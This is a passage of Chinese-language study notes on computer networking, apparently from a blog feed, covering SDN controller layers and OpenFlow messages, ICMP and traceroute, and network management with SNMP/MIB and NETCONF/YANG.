<p>SDN 将 network functionality 进行了 unbundle<span class="mojikumi-line-end">，</span>使得 packet switches<span class="mojikumi-line-end">、</span>SDN controller<span class="mojikumi-line-end">、</span>network management applications 可以来自不同的供应商<span class="mojikumi-line-end">，</span>各自发展<span class="mojikumi-line-end">。</span></p>
<ul>
<li>communication layer (<i>northbound API</i>): controlled devices 和 SDN controller 进行通信<span class="mojikumi-line-end">。</span>SDN controller 向 controlled device 发送信息<span class="mojikumi-line-start">（</span>例如 flow table<span class="mojikumi">）</span><span class="mojikumi-line-end">，</span>从 controlled device 获取 link state 等信息<span class="mojikumi-line-end">，</span>并在 network state 发生改变时被通知<span class="mojikumi-line-end">。</span>可以使用 OpenFlow<span class="mojikumi-line-end">、</span>SNMP 等协议<span class="mojikumi-line-end">。</span></li>
<li>network-wide state-management layer: SDN controller 存储了一些信息<span class="mojikumi-line-end">，</span>包括 network state<span class="mojikumi-line-end">、</span>flow table<span class="mojikumi-line-end">、</span>统计数据等<span class="mojikumi-line-end">。</span></li>
<li>interface to the network-control application layer (<i>southbound API</i>): network management applications 可以从 SDN controller 获取 network state<span class="mojikumi-line-end">，</span>订阅状态发生改变的 event<span class="mojikumi-line-end">。</span>通过 RESTful API 等方式通信<span class="mojikumi-line-end">。</span></li>
</ul>
<p>在 OpenFlow 中<span class="mojikumi-line-end">，</span>SDN controller 可以向 controlled device 发送<span class="mojikumi-line-end">：</span></p>
<ul>
<li>configuration<span class="mojikumi-line-end">，</span>修改配置参数</li>
<li>modify-state<span class="mojikumi-line-end">，</span>例如修改 flow table</li>
<li>read-state<span class="mojikumi-line-end">，</span>例如获取统计信息</li>
<li>send-packet<span class="mojikumi-line-end">，</span>让 router 发出一个 packet</li>
</ul>
<p>controlled device 可以向 SDN controller 发送<span class="mojikumi-line-end">：</span></p>
<ul>
<li>flow-removed: 通知一个 flow table entry 已被移除<span class="mojikumi-line-start">（</span>timeout 或者被 modify-state 删除<span class="mojikumi-line-end">）</span></li>
<li>port-status: 例如一个 link up/down 了</li>
<li>packet-in: 如果一个 packet 在 flow table 中没有 match<span class="mojikumi-line-end">，</span>或者 action 为发送到 controller</li>
</ul>
<h2 id="icmp-the-internet-control-message-protocol" class="heading"><a href="#icmp-the-internet-control-message-protocol" class="heading-anchor" aria-label="章节： ICMP: The Internet Control Message Protocol" tabindex="-1"></a><span>ICMP: The Internet Control Message Protocol</span></h2>
<p>ICMP 用来进行 router 和 host 之间的通信<span class="mojikumi-line-end">，</span>作为 IP payload 进行传输<span class="mojikumi-line-end">。</span></p>
<p>ICMP message 有很多种<span class="mojikumi-line-end">，</span>例如<span class="mojikumi-line-end">：</span></p>
<ul>
<li>用来 ping 的 echo request 和 echo reply</li>
<li>destination network/host/protocol/port unreachable</li>
<li>router advertisement</li>
<li>router discovery</li>
<li>TTL expired</li>
<li>IP header bad</li>
</ul>
<p>Traceroute 就是通过 ICMP 实现的<span class="mojikumi-line-end">：</span>向一个 unlikely port number 发送 TTL 递增的 UDP datagram<span class="mojikumi-line-end">，</span>通过 TTL expired 得到每个 router 的信息<span class="mojikumi-line-end">，</span>通过 port unreachable 得到终点的信息<span class="mojikumi-line-end">。</span></p>
<h2 id="network-management-and-snmp-netconfyang" class="heading"><a href="#network-management-and-snmp-netconfyang" class="heading-anchor" aria-label="章节： Network Management and SNMP, NETCONF/YANG" tabindex="-1"></a><span>Network Management and SNMP, NETCONF/YANG</span></h2>
<blockquote>
<p>Network management involves the deployment, integration and coordination of all the hardware, software and human elements to monitor, test, poll, configure, analyze, evaluate, and control the network and element resources to meet the real-time, operational performance and quality-of-service (QoS) requirements at reasonable cost.<sup><a href="#user-content-fn-saydam-1996" id="user-content-fnref-saydam-1996" data-footnote-ref aria-describedby="footnote-label">2</a></sup></p>
</blockquote>
<p>network management 包括 managing server (以及 network manager)<span class="mojikumi-line-end">、</span>managed device<span class="mojikumi-line-end">、</span>data<span class="mojikumi-line-start">（</span>每个 device 有 configuration<span class="mojikumi-line-end">、</span>operational data<span class="mojikumi-line-end">、</span>device statistics<span class="mojikumi-line-end">，</span>而 managing server 有每个 device 以及整个 network 的 data<span class="mojikumi">）</span><span class="mojikumi-line-end">、</span>network management agent<span class="mojikumi-line-end">、</span>network management protocol<span class="mojikumi-line-end">。</span></p>
<p>network management 有若干方式<span class="mojikumi-line-end">：</span></p>
<ul>
<li>CLI: error-prone<span class="mojikumi-line-end">，</span>难以 scale<span class="mojikumi-line-end">。</span></li>
<li>SNMP/MIB: 每个 device 有 management information base (MIB) objects<span class="mojikumi-line-end">，</span>可以通过 simple network management protocol (SNMP) 来获取/设置 MIB objects 中的 data<span class="mojikumi-line-end">，</span>device 也可以通过 trap message 向 managing server 通知状态变化<span class="mojikumi-line-end">。</span>SNMP/MIB 是针对单个 device 的<span class="mojikumi-line-end">，</span>也难以 scale<span class="mojikumi-line-end">。</span></li>
<li>NETCONF/YANG: NETCONF 比起 SNMP 更注重于配置管理<span class="mojikumi-line-end">，</span>可以一次性操控多个 device (atomic network management transaction)<span class="mojikumi-line-end">，</span>可以设置 constraint 检查配置的正确性<span class="mojikumi-line-end">，</span>使用 YANG 作为 data modeling language<span class="mojikumi-line-end">，</span>以 XML 格式通过 TLS 进行通信<span class="mojikumi-line-end">。</span></li>
</ul>
<section data-footnotes class="footnotes"><h2 class="sr-only" id="footnote-label">Footnotes</h2>
<ol>
<li id="user-content-fn-fig-5.7-b">
<p>p393, Figure 5.7: Changes in link cost, b. <a href="#user-content-fnref-fig-5.7-b" data-footnote-backref class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
<li id="user-content-fn-saydam-1996">
<p>Saydam, T., Magedanz, T. From networks and network management into service and service management. J Netw Syst Manage 4, 345–348 (1996). <a href="https://doi.org/10.1007/BF02283158">https<wbr>://<wbr>doi<wbr>.<wbr>org<wbr>/<wbr>10<wbr>.<wbr>1007<wbr>/<wbr>BF02283158</a> <a href="#user-content-fnref-saydam-1996" data-footnote-backref class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
</ol>
</section>]]></content:encoded>
            <category domain="https://ouuan.moe/tag/cnatda">cnatda</category>
            <category domain="https://ouuan.moe/tag/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">学习笔记</category>
        </item>
    </channel>
</rss>